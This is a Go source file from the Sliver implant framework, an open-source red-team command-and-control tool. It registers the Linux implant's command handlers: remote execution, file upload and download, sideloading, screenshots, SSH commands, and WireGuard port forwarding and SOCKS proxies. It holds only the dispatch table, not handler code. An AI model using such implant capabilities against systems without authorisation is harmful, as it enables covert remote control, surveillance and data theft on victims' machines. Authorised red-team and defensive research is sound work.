package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

var (
	linuxHandlers = map[uint32]RPCHandler{
		sliverpb.MsgPsReq:        psHandler,
		sliverpb.MsgTerminateReq: terminateHandler,
		sliverpb.MsgPing:         pingHandler,
		sliverpb.MsgLsReq:        dirListHandler,
		sliverpb.MsgDownloadReq:  downloadHandler,
		sliverpb.MsgUploadReq:    uploadHandler,
		sliverpb.MsgCdReq:        cdHandler,
		sliverpb.MsgPwdReq:       pwdHandler,
		sliverpb.MsgRmReq:        rmHandler,
		sliverpb.MsgMkdirReq:     mkdirHandler,
		sliverpb.MsgTaskReq:      taskHandler,
		sliverpb.MsgIfconfigReq:  ifconfigHandler,
		sliverpb.MsgExecuteReq:   executeHandler,
		sliverpb.MsgEnvReq:       getEnvHandler,
		sliverpb.MsgSetEnvReq:    setEnvHandler,
		sliverpb.MsgUnsetEnvReq:  unsetEnvHandler,

		sliverpb.MsgScreenshotReq: screenshotHandler,

		sliverpb.MsgNetstatReq:  netstatHandler,
		sliverpb.MsgSideloadReq: sideloadHandler,

		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,

		// {{if .Config.WGc2Enabled}}
		// Wireguard specific
		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
		sliverpb.MsgWGListForwardersReq: wgListTCPForwardersHandler,
		sliverpb.MsgWGStartSocksReq:     wgStartSocksHandler,
		sliverpb.MsgWGStopSocksReq:      wgStopSocksHandler,
		sliverpb.MsgWGListSocksReq:      wgListSocksServersHandler,
		// {{end}}
	}

	linuxPivotHandlers = map[uint32]PivotHandler{}
)

// GetSystemHandlers - Returns a map of the linux system handlers
func GetSystemHandlers() map[uint32]RPCHandler {
	return linuxHandlers
}

// GetSystemPivotHandlers - Returns a map of the linux system handlers
func GetSystemPivotHandlers() map[uint32]PivotHandler {
	return linuxPivotHandlers
}
